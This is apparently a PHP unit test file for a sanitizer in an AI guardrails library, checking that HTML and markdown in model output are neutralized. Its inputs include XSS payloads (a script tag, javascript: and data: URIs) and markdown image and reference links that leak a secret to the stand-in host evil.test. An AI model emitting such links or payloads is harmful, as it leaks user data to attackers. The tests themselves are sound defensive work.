<?php

declare(strict_types=1);

namespace Padosoft\AiGuardrails\Tests\Unit;

use Padosoft\AiGuardrails\Output\HtmlMarkdownSanitizer;
use Padosoft\AiGuardrails\Tests\TestCase;

final class HtmlMarkdownSanitizerTest extends TestCase
{
    public function test_escapes_html_tags(): void
    {
        $out = (new HtmlMarkdownSanitizer(sanitizeHtml: true, neutralizeMarkdown: false))
            ->sanitize('<script>steal()</script>');

        self::assertStringNotContainsString('<script>', $out);
        self::assertStringContainsString('&lt;script&gt;', $out);
    }

    public function test_neutralizes_markdown_image_exfiltration_vector(): void
    {
        $out = (new HtmlMarkdownSanitizer(sanitizeHtml: false, neutralizeMarkdown: true))
            ->sanitize('![x](http://evil.test/leak?data=secret)');

        self::assertStringNotContainsString('](http://evil.test', $out);
        self::assertStringNotContainsString('evil.test', $out);
    }

    public function test_neutralizes_markdown_link_with_javascript_uri(): void
    {
        $out = (new HtmlMarkdownSanitizer(sanitizeHtml: false, neutralizeMarkdown: true))
            ->sanitize('[click me](javascript:alert(1))');

        self::assertStringNotContainsString('javascript:', $out);
    }

    public function test_neutralizes_reference_link_definition(): void
    {
        $out = (new HtmlMarkdownSanitizer(sanitizeHtml: false, neutralizeMarkdown: true))
            ->sanitize("[exfil][ref]\n[ref]: https://evil.test/steal?d=secret");

        self::assertStringNotContainsString('evil.test', $out);
    }

    public function test_neutralizes_reference_link_definition_with_title(): void
    {
        $out = (new HtmlMarkdownSanitizer(sanitizeHtml: false, neutralizeMarkdown: true))
            ->sanitize('[ref]: https://evil.test/steal "Title"');

        self::assertStringNotContainsString('evil.test', $out);
    }

    public function test_neutralizes_javascript_autolink_without_double_slash(): void
    {
        $out = (new HtmlMarkdownSanitizer(sanitizeHtml: true, neutralizeMarkdown: true))
            ->sanitize('<javascript:alert(1)>');

        self::assertStringNotContainsString('javascript:', $out);
    }

    public function test_neutralizes_data_uri_autolink(): void
    {
        $out = (new HtmlMarkdownSanitizer(sanitizeHtml: true, neutralizeMarkdown: true))
            ->sanitize('<data:text/html,<h1>xss</h1>>');

        self::assertStringNotContainsString('data:', $out);
    }

    public function test_idempotent_on_plain_text(): void
    {
        $sanitizer = new HtmlMarkdownSanitizer(sanitizeHtml: true, neutralizeMarkdown: true);

        self::assertSame('Hello world.', $sanitizer->sanitize('Hello world.'));
    }

    public function test_defang_fails_closed_on_pcre_error(): void
    {
        $sanitizer = new HtmlMarkdownSanitizer;
        $defang = new \ReflectionMethod($sanitizer, 'defang');

        // A /u pattern against a bad-UTF-8 subject makes preg_replace() return null (error). The
        // helper must fail CLOSED — strip the structural link/autolink characters, not return raw.
        $out = $defang->invoke($sanitizer, '/x/u', 'y', "[a](<\xFF\xFE>)");

        self::assertStringNotContainsString('(', $out);
        self::assertStringNotContainsString('<', $out);
        self::assertStringNotContainsString(')', $out);
    }

    public function test_does_not_double_encode(): void
    {
        $sanitizer = new HtmlMarkdownSanitizer(sanitizeHtml: true, neutralizeMarkdown: false);

        $once = $sanitizer->sanitize('a < b & c');
        self::assertSame($once, $sanitizer->sanitize($once));
    }
}
